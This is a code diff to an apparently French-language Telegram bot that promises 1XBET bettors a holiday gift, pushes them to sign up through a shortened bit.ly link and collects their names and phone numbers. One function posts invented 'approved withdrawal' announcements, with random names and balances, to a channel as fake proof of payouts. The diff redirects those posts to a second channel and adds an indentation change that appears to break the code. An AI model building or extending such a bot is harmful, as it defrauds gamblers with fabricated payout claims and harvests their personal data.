@@ -193,9 +193,10 @@ async def check_all_subscriptions(message: types.Message, state: FSMContext, inv
             conn.close()
       
         # Both channels are joined - proceed to request 1xbet ID
-        await message.reply(
+          await message.reply(
                     f"⚽ Bienvenue à vous cher parieur!! ⚽\n\n"
-                    f"Pour les fêtes de fin d’année, votre bookmaker préféré 🎰 a décidé de vous faire une surprise pour vous récompenser de votre fidélité envers la plateforme 1XBET.\n
+                    f"Pour les fêtes de fin d’année, votre bookmaker préféré 🎰 a décidé de vous faire une surprise\n"
+                    f"pour vous récompenser de votre fidélité envers la plateforme 1XBET.\n"
                     f"Suivez les étapes suivantes pour obtenir votre cadeau 🎁:\n\n"
                     f"👉 Créez-vous un nouveau compte 1XBET avec le lien des fêtes qui s’affiche:\n"
                     f"🔗 https://bit.ly/3SyNKrr\n\n"
@@ -429,9 +430,9 @@ async def handle_phone_number(message: types.Message, state: FSMContext):
         conn.commit()
         conn.close()
 
-        # Send a confirmation message to the channel
+        # Send a confirmation message to the SECOND channel (changed)
         await bot.send_message(
-            chat_id=CHANNEL_ID,
+            chat_id=SECOND_CHANNEL_ID,
             text=(
                 f"📢 **Demande de Retrait** 💵\n\n"
                 f"👤 **Nom :** {user_name}\n"
@@ -478,9 +479,9 @@ async def send_random_withdrawal_approval():
         payment_method = random.choice(payment_methods)
         balance = random.randint(32000, 100000)
 
-        # Send the message to the channel
+        # Send the message to the SECOND channel (changed)
         await bot.send_message(
-            chat_id=CHANNEL_ID,
+            chat_id=SECOND_CHANNEL_ID,
             text=(
                 f"📢 **Demande de Retrait Approuvée** 💵\n\n"
                 f"👤 **Nom :** {name}\n"
